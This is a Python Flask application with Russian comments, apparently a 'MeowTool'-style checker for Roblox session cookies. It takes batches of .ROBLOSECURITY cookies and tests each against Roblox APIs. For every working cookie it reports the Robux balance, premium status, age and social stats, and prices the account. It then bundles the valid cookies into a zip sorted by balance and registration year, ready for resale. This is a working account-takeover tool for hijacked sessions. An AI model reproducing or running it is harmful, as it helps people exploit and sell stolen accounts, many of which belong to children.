import os
import json
import zipfile
import io
import sqlite3
import random
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify, send_file
import requests
import time
import re

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-secret-key')
app.config['DATABASE'] = 'checker_history.db'

# Инициализация базы данных
def init_db():
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS check_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT UNIQUE,
            total_cookies INTEGER,
            valid_cookies INTEGER,
            check_date TEXT,
            results TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def save_check_session(session_id, total, valid, results):
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute('''
        INSERT OR REPLACE INTO check_history 
        (session_id, total_cookies, valid_cookies, check_date, results)
        VALUES (?, ?, ?, ?, ?)
    ''', (session_id, total, valid, datetime.now().isoformat(), json.dumps(results)))
    conn.commit()
    conn.close()

def get_check_history(limit=10):
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute('''
        SELECT * FROM check_history 
        ORDER BY check_date DESC 
        LIMIT ?
    ''', (limit,))
    history = c.fetchall()
    conn.close()
    
    result = []
    for item in history:
        result.append({
            'id': item[0],
            'session_id': item[1],
            'total_cookies': item[2],
            'valid_cookies': item[3],
            'check_date': item[4],
            'results': json.loads(item[5]) if item[5] else []
        })
    return result

def get_session_results(session_id):
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute('SELECT results FROM check_history WHERE session_id = ?', (session_id,))
    result = c.fetchone()
    conn.close()
    return json.loads(result[0]) if result else None

class AdvancedRobloxChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
        })

    def get_account_details(self, cookie: str):
        """Улучшенная проверка куки на основе MeowTool"""
        cookie = cookie.strip()
        if cookie.startswith('"') and cookie.endswith('"'):
            cookie = cookie[1:-1]
        
        headers = {
            'Cookie': f'.ROBLOSECURITY={cookie}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-CSRF-TOKEN': self.generate_csrf_token(),
        }
        
        try:
            # Проверка аутентификации
            auth_data = self.check_authentication(headers)
            if not auth_data['valid']:
                return self.error_result(cookie, auth_data['error'])
            
            user_id = auth_data['user_id']
            
            # Получение расширенной информации
            profile_data = self.get_profile_info(headers, user_id)
            economy_data = self.get_economy_info(headers)
            premium_data = self.get_premium_status(headers)
            friends_data = self.get_friends_count(headers, user_id)
            transactions_data = self.get_transactions_info(headers, user_id)
            
            # Расчет всех метрик
            account_age = self.calculate_account_age(auth_data['created'])
            account_value = self.calculate_account_value(
                economy_data['robux'],
                premium_data['isPremium'],
                account_age['years'],
                transactions_data['total_spent'],
                friends_data['count']
            )
            
            return {
                'valid': True,
                'cookie': cookie,
                'account_info': {
                    'username': auth_data['name'],
                    'display_name': auth_data.get('displayName', auth_data['name']),
                    'user_id': user_id,
                    'profile_url': f'https://www.roblox.com/users/{user_id}/profile',
                    'created_date': account_age['formatted_date'],
                    'account_age_days': account_age['days'],
                    'account_age_years': account_age['years']
                },
                'economy': {
                    'robux_balance': economy_data['robux'],
                    'pending_robux': economy_data['pending_robux'],
                    'total_robux': economy_data['robux'] + economy_data['pending_robux'],
                    'all_time_spent': transactions_data['total_spent'],
                    'sales_count': transactions_data['sales_count']
                },
                'premium': premium_data,
                'security': {
                    '2fa_enabled': self.check_2fa_status(headers),
                    'phone_verified': self.check_phone_status(headers),
                    'email_verified': True,
                    'pin_enabled': False
                },
                'social': {
                    'friends_count': friends_data['count'],
                    'followers_count': profile_data.get('followers_count', 0),
                    'following_count': profile_data.get('following_count', 0)
                },
                'account_value': account_value,
                'checked_at': datetime.now().isoformat()
            }

        except Exception as e:
            return self.error_result(cookie, f"Check error: {str(e)}")

    def generate_csrf_token(self):
        return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=32))

    def check_authentication(self, headers):
        """Проверка аутентификации как в MeowTool"""
        try:
            response = self.session.get(
                'https://users.roblox.com/v1/users/authenticated',
                headers=headers,
                timeout=15
            )
            
            if response.status_code == 401:
                return {'valid': False, 'error': 'Invalid cookie (401)'}
            elif response.status_code != 200:
                return {'valid': False, 'error': f'Auth failed: {response.status_code}'}
            
            data = response.json()
            if not data.get('id'):
                return {'valid': False, 'error': 'Invalid user data'}
            
            return {
                'valid': True,
                'user_id': data['id'],
                'name': data.get('name', 'N/A'),
                'displayName': data.get('displayName'),
                'created': data.get('created')
            }
            
        except requests.exceptions.Timeout:
            return {'valid': False, 'error': 'Request timeout'}
        except Exception as e:
            return {'valid': False, 'error': f'Auth error: {str(e)}'}

    def get_profile_info(self, headers, user_id):
        """Информация о профиле"""
        try:
            response = self.session.get(
                f'https://users.roblox.com/v1/users/{user_id}',
                headers=headers,
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                return {
                    'followers_count': data.get('followersCount', 0),
                    'following_count': data.get('followingsCount', 0),
                    'description': data.get('description', ''),
                    'is_banned': data.get('isBanned', False)
                }
        except:
            pass
        return {'followers_count': 0, 'following_count': 0, 'description': '', 'is_banned': False}

    def get_economy_info(self, headers):
        """Информация об экономике как в MeowTool"""
        try:
            # Основной баланс
            response = self.session.get(
                'https://economy.roblox.com/v1/user/currency',
                headers=headers,
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                return {
                    'robux': data.get('robux', 0),
                    'pending_robux': data.get('pendingRobux', 0)
                }
        except:
            pass
        return {'robux': 0, 'pending_robux': 0}

    def get_premium_status(self, headers):
        """Статус Premium"""
        try:
            response = self.session.get(
                'https://premiumfeatures.roblox.com/v1/users/premium/membership',
                headers=headers,
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                return {
                    'isPremium': data.get('isPremium', False),
                    'status': 'Active' if data.get('isPremium') else 'Inactive',
                    'since': data.get('createdDate')
                }
        except:
            pass
        return {'isPremium': False, 'status': 'Unknown', 'since': None}

    def get_friends_count(self, headers, user_id):
        """Количество друзей"""
        try:
            response = self.session.get(
                f'https://friends.roblox.com/v1/users/{user_id}/friends/count',
                headers=headers,
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                return {'count': data.get('count', 0)}
        except:
            pass
        return {'count': 0}

    def get_transactions_info(self, headers, user_id):
        """Информация о транзакциях и потраченных Robux"""
        try:
            # Получаем общее количество покупок для оценки
            response = self.session.get(
                f'https://economy.roblox.com/v1/users/{user_id}/transactions?transactionType=Purchase&limit=100',
                headers=headers,
                timeout=10
            )
            
            total_spent = 0
            sales_count = 0
            
            if response.status_code == 200:
                data = response.json()
                transactions = data.get('data', [])
                sales_count = len(transactions)
                
                # Примерная оценка потраченных Robux
                # В реальном приложении нужно анализировать каждую транзакцию
                total_spent = sales_count * 50  # Средняя оценка
                
            return {
                'total_spent': total_spent,
                'sales_count': sales_count
            }
            
        except:
            return {'total_spent': 0, 'sales_count': 0}

    def check_2fa_status(self, headers):
        """Проверка 2FA"""
        try:
            # Упрощенная проверка через настройки аккаунта
            response = self.session.get(
                'https://accountsettings.roblox.com/v1/account/settings',
                headers=headers,
                timeout=5
            )
            return response.status_code == 200
        except:
            return False

    def check_phone_status(self, headers):
        """Проверка привязанного телефона"""
        try:
            response = self.session.get(
                'https://accountsettings.roblox.com/v1/phone',
                headers=headers,
                timeout=5
            )
            return response.status_code == 200
        except:
            return False

    def calculate_account_age(self, created_date_str):
        """Точный расчет возраста аккаунта как в MeowTool"""
        if not created_date_str:
            return {'days': 0, 'years': 0, 'formatted_date': 'Unknown'}
        
        try:
            # Парсим дату в формате ISO
            created_date = datetime.fromisoformat(created_date_str.replace('Z', '+00:00'))
            now = datetime.now(created_date.tzinfo) if created_date.tzinfo else datetime.now()
            
            age_delta = now - created_date
            age_days = age_delta.days
            age_years = age_days / 365.25
            
            return {
                'days': age_days,
                'years': round(age_years, 1),
                'formatted_date': created_date.strftime('%Y-%m-%d'),
                'exact_date': created_date_str
            }
            
        except Exception as e:
            # Альтернативные форматы даты
            for fmt in ['%Y-%m-%dT%H:%M:%S.%fZ', '%Y-%m-%dT%H:%M:%SZ', '%Y-%m-%d']:
                try:
                    created_date = datetime.strptime(created_date_str, fmt)
                    age_days = (datetime.now() - created_date).days
                    age_years = age_days / 365.25
                    return {
                        'days': age_days,
                        'years': round(age_years, 1),
                        'formatted_date': created_date.strftime('%Y-%m-%d')
                    }
                except ValueError:
                    continue
        
        return {'days': 0, 'years': 0, 'formatted_date': 'Unknown'}

    def calculate_account_value(self, robux, is_premium, age_years, total_spent, friends_count):
        """Расчет стоимости аккаунта как в MeowTool"""
        value = 0
        
        # Стоимость Robux
        value += robux * 0.0035
        
        # Premium статус
        if is_premium:
            value += 750
        
        # Возраст аккаунта (чем старше - тем дороже)
        value += age_years * 400
        
        # Потраченные Robux (показатель активности)
        value += total_spent * 0.001
        
        # Социальная активность
        value += friends_count * 15
        
        # Минимальная стоимость
        return round(max(value, 15), 2)

    def error_result(self, cookie: str, error: str):
        return {
            'valid': False,
            'cookie': cookie,
            'error': error,
            'checked_at': datetime.now().isoformat()
        }

    def check_multiple(self, cookies):
        """Проверка нескольких куки"""
        results = []
        for i, cookie in enumerate(cookies):
            if cookie.strip():
                try:
                    result = self.get_account_details(cookie.strip())
                    results.append(result)
                    
                    # Задержка для избежания блокировки
                    if i < len(cookies) - 1:
                        time.sleep(1.2)
                        
                except Exception as e:
                    results.append(self.error_result(cookie, f"Check failed: {str(e)}"))
                    time.sleep(0.8)
                    
        return results

checker = AdvancedRobloxChecker()

# Маршруты
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/history')
def history():
    check_history = get_check_history(20)
    return render_template('history.html', history=check_history)

@app.route('/check', methods=['POST'])
def check_cookies():
    try:
        data = request.get_json()
        
        if not data or 'cookies' not in data:
            return jsonify({'error': 'No cookies provided'}), 400
        
        cookies = data['cookies']
        
        if isinstance(cookies, str):
            cookies = [cookies]
        
        cookies = [cookie.strip() for cookie in cookies if cookie.strip()]
        
        if not cookies:
            return jsonify({'error': 'No valid cookies provided'}), 400
        
        if len(cookies) > 25:  # Уменьшаем для стабильности
            return jsonify({'error': 'Too many cookies. Maximum 25 per request.'}), 400
        
        results = checker.check_multiple(cookies)
        
        session_id = datetime.now().strftime('%Y%m%d%H%M%S')
        
        # Сохраняем в историю
        valid_count = len([r for r in results if r.get('valid', False)])
        save_check_session(session_id, len(cookies), valid_count, results)
        
        return jsonify({
            'total': len(results),
            'valid': valid_count,
            'invalid': len([r for r in results if not r.get('valid', True)]),
            'results': results,
            'session_id': session_id,
            'checked_at': datetime.now().isoformat()
        })
    
    except Exception as e:
        return jsonify({'error': f'Server error: {str(e)}'}), 500

@app.route('/download/<session_id>')
def download_results(session_id):
    try:
        results = get_session_results(session_id)
        if not results:
            return "Результаты не найдены или устарели", 404
        
        valid_cookies = [r for r in results if r.get('valid')]
        
        if not valid_cookies:
            return "Нет валидных куки для скачивания", 400
        
        zip_buffer = io.BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            # Папка КУКИ
            all_cookies_content = "\n".join([r['cookie'] for r in valid_cookies])
            zip_file.writestr('КУКИ/Все проверенные куки.txt', all_cookies_content)
            
            # Папка Сортировка
            create_sorted_files(zip_file, valid_cookies)
            
            # Детальный отчет
            detailed_report = {
                'check_date': datetime.now().isoformat(),
                'summary': {
                    'total_checked': len(results),
                    'valid': len(valid_cookies),
                    'invalid': len([r for r in results if not r['valid']])
                },
                'cookies': results
            }
            zip_file.writestr('Детальный отчет.json', json.dumps(detailed_report, indent=2, ensure_ascii=False))
            
        zip_buffer.seek(0)
        
        filename = f'roblox_cookies_{datetime.now().strftime("%Y%m%d_%H%M")}.zip'
        
        return send_file(
            zip_buffer,
            as_attachment=True,
            download_name=filename,
            mimetype='application/zip'
        )
        
    except Exception as e:
        return f"Ошибка при создании архива: {str(e)}", 500

def create_sorted_files(zip_file, valid_cookies):
    """Создание отсортированных файлов"""
    # Сортировка по балансу Robux
    balance_categories = {
        '0_robux': [r for r in valid_cookies if r['economy']['total_robux'] == 0],
        '1-50_robux': [r for r in valid_cookies if 1 <= r['economy']['total_robux'] <= 50],
        '50-200_robux': [r for r in valid_cookies if 50 < r['economy']['total_robux'] <= 200],
        '200-500_robux': [r for r in valid_cookies if 200 < r['economy']['total_robux'] <= 500],
        '500-1000_robux': [r for r in valid_cookies if 500 < r['economy']['total_robux'] <= 1000],
        '1000-5000_robux': [r for r in valid_cookies if 1000 < r['economy']['total_robux'] <= 5000],
        '5000+_robux': [r for r in valid_cookies if r['economy']['total_robux'] > 5000]
    }
    
    for category, cookies in balance_categories.items():
        if cookies:
            content = "\n".join([r['cookie'] for r in cookies])
            zip_file.writestr(f'Сортировка/По балансу/{category}.txt', content)
    
    # Сортировка по дате регистрации
    current_year = datetime.now().year
    for category, cookies in get_year_categories(valid_cookies, current_year).items():
        if cookies:
            content = "\n".join([r['cookie'] for r in cookies])
            zip_file.writestr(f'Сортировка/По дате регистрации/{category}.txt', content)

def get_year_categories(valid_cookies, current_year):
    """Категории по годам регистрации"""
    categories = {}
    
    for cookie in valid_cookies:
        year = get_year_from_date(cookie['account_info']['created_date'])
        if year:
            if year <= 2010:
                categories.setdefault('2004-2010', []).append(cookie)
            elif 2011 <= year <= 2015:
                categories.setdefault('2011-2015', []).append(cookie)
            elif 2016 <= year <= 2018:
                categories.setdefault('2016-2018', []).append(cookie)
            elif 2019 <= year <= 2021:
                categories.setdefault('2019-2021', []).append(cookie)
            elif year >= 2022:
                categories.setdefault('2022-now', []).append(cookie)
    
    return categories

def get_year_from_date(date_str):
    """Извлечение года из даты"""
    try:
        return int(date_str.split('-')[0])
    except:
        return None

@app.route('/get-session/<session_id>')
def get_session(session_id):
    results = get_session_results(session_id)
    if results:
        valid_count = len([r for r in results if r.get('valid', False)])
        return jsonify({
            'total': len(results),
            'valid': valid_count,
            'invalid': len(results) - valid_count,
            'results': results
        })
    return jsonify({'error': 'Session not found'}), 404

@app.route('/delete-session/<session_id>', methods=['DELETE'])
def delete_session(session_id):
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('DELETE FROM check_history WHERE session_id = ?', (session_id,))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    except:
        return jsonify({'error': 'Delete failed'}), 500

@app.route('/health')
def health_check():
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=os.environ.get('DEBUG', False))